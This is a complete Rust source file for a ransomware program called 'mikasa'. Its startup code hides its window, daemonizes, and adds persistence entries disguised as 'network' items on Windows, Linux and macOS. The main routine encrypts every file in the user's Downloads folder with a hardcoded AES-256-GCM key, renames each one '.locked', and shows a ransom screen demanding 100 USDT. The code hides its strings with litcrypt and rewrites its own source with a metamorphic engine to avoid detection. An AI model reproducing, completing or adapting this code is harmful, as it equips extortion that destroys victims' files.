#![cfg_attr(windows, windows_subsystem = "windows")]
#[macro_use]
extern crate litcrypt;

use std::env;
use std::fs::{self, File, OpenOptions, rename};
use std::io::{self, Read, Write};
use std::path::PathBuf;

use aes_gcm::{
    Aes256Gcm, Nonce,
    aead::{Aead, KeyInit, OsRng, rand_core::RngCore},
};
use eframe::egui::{self, Color32, FontId, RichText};
use eframe::{App, Frame};
use walkdir::WalkDir;

use epaint::{CornerRadius, Margin};
use metamorph;

#[cfg(unix)]
use daemonize::Daemonize;

use_litcrypt!("dwNJSd344#@3(@)3dms");

pub struct mikasaUI;

// METAMORPHIC_MARKER_START
impl App for mikasaUI {
    fn update(&mut self, r_ctx: &egui::Context, _r_frame: &mut Frame) {
        egui::CentralPanel::default()
            .frame(egui::Frame::default().fill(Color32::from_rgb(200, 0, 0)))
            .show(r_ctx, |r_ui| {
                r_ui.vertical_centered(|r_ui| {
                    r_ui.add_space(20.0);
                    r_ui.heading(
                        RichText::new(lc!("WARNING!"))
                            .size(45.0)
                            .color(Color32::WHITE)
                            .strong(),
                    );
                    r_ui.add_space(10.0);
                    r_ui.label(
                        RichText::new(lc!("Your system has been encrypted!"))
                            .color(Color32::WHITE)
                            .size(24.0),
                    );
                    r_ui.add_space(30.0);
                });

                egui::Frame::group(r_ui.style())
                    .fill(Color32::from_rgb(255, 80, 80))
                    .inner_margin(Margin::same(15))
                    .corner_radius(CornerRadius::same(10))
                    .show(r_ui, |r_ui| {
                        r_ui.vertical(|r_ui| {
                            r_ui.label(
                                RichText::new(lc!("What the HELL is it?"))
                                    .color(Color32::WHITE)
                                    .font(FontId::proportional(22.0))
                                    .strong(),
                            );
                            r_ui.label(
                                RichText::new(
                                    lc!("Some program encrypted your files: documents, music, pictures... They are now locked with strong encryption and can't be recovered without the key.")
                                )
                                .color(Color32::WHITE)
                                .size(16.0),
                            );
                        });
                    });

                r_ui.add_space(20.0);

                egui::Frame::group(r_ui.style())
                    .fill(Color32::from_rgb(255, 80, 80))
                    .inner_margin(Margin::same(15))
                    .corner_radius(CornerRadius::same(10))
                    .show(r_ui, |r_ui| {
                        r_ui.vertical(|r_ui| {
                            r_ui.label(
                                RichText::new(lc!("How can I recover my files?"))
                                    .color(Color32::WHITE)
                                    .font(FontId::proportional(22.0))
                                    .strong(),
                            );
                            r_ui.label(
                                RichText::new(lc!("Please send 100 USDT to the following address:"))
                                    .color(Color32::WHITE)
                                    .size(16.0),
                            );
                            r_ui.add_space(10.0);
                            r_ui.code(lc!("1HqYy3oB1c2nXNkL8XzvM3rF5TfESuK9uE"));
                            r_ui.add_space(15.0);
                            r_ui.label(
                                RichText::new(lc!("After payment, click the button below to start decryption."))
                                    .color(Color32::WHITE),
                            );

                            r_ui.add_enabled_ui(false, |r_ui| {
                                r_ui.add_sized([200.0, 40.0], egui::Button::new(lc!("Decrypt Files")));
                            });

                            r_ui.add_space(10.0);
                            r_ui.label(
                                RichText::new(
                                    lc!("MADE WITH LOVE BY HUMAN BEING ON EARTH")
                                )
                                .color(Color32::WHITE)
                                .italics(),
                            );
                        });
                    });

                r_ui.add_space(20.0);

                egui::Frame::group(r_ui.style())
                    .fill(Color32::from_rgb(120, 0, 0))
                    .inner_margin(Margin::same(10))
                    .corner_radius(CornerRadius::same(8))
                    .show(r_ui, |r_ui| {
                        r_ui.vertical(|r_ui| {
                            r_ui.label(
                                RichText::new(lc!("Sample of Encrypted Files"))
                                    .color(Color32::LIGHT_GRAY)
                                    .size(18.0)
                                    .strong(),
                            );
                            r_ui.separator();
                            r_ui.monospace(lc!("📄 resume.docx.locked"));
                            r_ui.monospace(lc!("🎵 anime_op.mp3.locked"));
                            r_ui.monospace(lc!("📷 vacation.jpg.locked"));
                            r_ui.monospace(lc!("📁 important.zip.locked"));
                            r_ui.monospace(lc!("🗃️ notes.txt.locked"));
                        });
                    });

                r_ui.add_space(30.0);
            });
    }
}

#[cfg(target_os = "windows")]
fn add_to_startup() {
    let r_exe_path = env::current_exe().unwrap();
    let r_startup_dir = dirs::config_dir()
        .unwrap()
        .join(lc!("Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
    let r_shortcut_path = r_startup_dir.join(lc!("network.bat"));

    let r_content = format!("start \"\" \"{}\"", r_exe_path.display());
    fs::write(&r_shortcut_path, r_content).expect("");
}

#[cfg(target_os = "linux")]
fn add_to_startup() {
    let r_exe_path = env::current_exe().unwrap();
    let r_autostart_dir = dirs::config_dir().unwrap().join(lc!("autostart"));
    fs::create_dir_all(&r_autostart_dir).unwrap();

    let r_desktop_file = r_autostart_dir.join(lc!("network.desktop"));
    let r_content = format!(
        lc!(
            "[Desktop Entry]\nType=Application\nExec={}\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=My Rust App\n"
        ),
        r_exe_path.display()
    );

    fs::write(&r_desktop_file, r_content).expect("");
}

#[cfg(target_os = "macos")]
fn add_to_startup() {
    let r_exe_path = env::current_exe().unwrap();
    let r_plist_dir = dirs::home_dir().unwrap().join(lc!("Library/LaunchAgents"));
    fs::create_dir_all(&r_plist_dir).unwrap();

    let r_plist_path = r_plist_dir.join(lc!("com.network.startup.plist"));
    let r_content = format!(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\
        <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \
        \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n\
        <plist version=\"1.0\">\n<dict>\n\
        <key>Label</key><string>com.myapp.startup</string>\n\
        <key>ProgramArguments</key>\n<array>\n<string>{}</string>\n</array>\n\
        <key>RunAtLoad</key><true/>\n\
        </dict>\n</plist>\n",
        r_exe_path.display()
    );

    fs::write(&r_plist_path, r_content).expect("");
}

fn get_dir() -> Option<PathBuf> {
    dirs::home_dir().map(|r_path| r_path.join("Downloads"))
}

fn encrypt_file(r_path: &PathBuf, r_cipher: &Aes256Gcm) -> io::Result<()> {
    if let Some(r_file_name) = r_path.file_name().and_then(|n| n.to_str()) {
        if r_file_name.ends_with(".locked") {
            return Ok(());
        }
    }

    let mut r_file = File::open(r_path)?;
    let mut r_buffer = Vec::new();
    r_file.read_to_end(&mut r_buffer)?;

    let mut r_nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut r_nonce_bytes);
    let r_nonce = Nonce::from_slice(&r_nonce_bytes);

    let r_encrypted_data = r_cipher
        .encrypt(r_nonce, r_buffer.as_ref())
        .map_err(|_| io::Error::new(io::ErrorKind::Other, lc!("Encryption failed")))?;

    let mut r_out_file = OpenOptions::new().write(true).truncate(true).open(r_path)?;
    r_out_file.write_all(&r_nonce_bytes)?;
    r_out_file.write_all(&r_encrypted_data)?;
    r_out_file.flush()?;

    let mut r_new_path = r_path.clone();
    let r_new_file_name = format!(
        "{}.locked",
        r_path
            .file_name()
            .and_then(|r_name| r_name.to_str())
            .unwrap_or("")
    );
    r_new_path.set_file_name(r_new_file_name);
    rename(r_path, &r_new_path)?;

    Ok(())
}

fn entry() -> Result<(), eframe::Error> {
    add_to_startup();
    let r_key_str = String::from(lc!("g_w`:D2Xq6Yxez-5{#3mfd=VcB.Qhsub"));
    let r_key_bytes = r_key_str.as_bytes();
    let mut r_encryption_status = false;

    let r_key = aes_gcm::Key::<Aes256Gcm>::from_slice(r_key_bytes);
    let r_cipher = Aes256Gcm::new(r_key);

    if let Some(r_home_dir) = get_dir() {
        for r_entry in WalkDir::new(r_home_dir).into_iter().filter_map(|e| e.ok()) {
            let r_path = r_entry.path().to_path_buf();
            if r_path.is_file()
                && !r_path
                    .extension()
                    .map_or(false, |r_ext| r_ext == "encrypted")
            {
                r_encryption_status = true;
                if let Err(r_e) = encrypt_file(&r_path, &r_cipher) {
                    eprintln!("{:?} {}", r_path, r_e);
                }
            }
        }
    }

    if r_encryption_status {
        let r_options = eframe::NativeOptions {
            viewport: egui::ViewportBuilder::default().with_inner_size([820.0, 700.0]),
            ..Default::default()
        };

        eframe::run_native(
            "MIKASA WARNING!",
            r_options,
            Box::new(|_r_cc| Ok(Box::new(mikasaUI))),
        )
    } else {
        Ok(())
    }
}

fn main() -> std::io::Result<()> {
    #[cfg(unix)]
    {
        let daemonize = Daemonize::new();
        if let Err(_e) = daemonize.start() {
            std::process::exit(1);
        }
    }

    entry();
    let r_source_code = include_str!("main.rs");
    let r_toml = r#"
[package]
name = "mikasa"
version = "0.1.0"
edition = "2024"

[dependencies]
aes-gcm = "0.10.3"
daemonize = "0.5.0"
dirs = "6.0.0"
eframe = "0.31.1"
epaint = "0.31.1"
litcrypt = "0.4.0"
metamorph = "1.0.0"
rand_core = "0.9.3"
walkdir = "2.5.0"
"#;

    let r_junk_code = 15;
    let r_project_name = "mikasa";

    metamorph::morph(r_source_code, r_toml, r_junk_code, r_project_name)?;
    Ok(())
}
// METAMORPHIC_MARKER_END
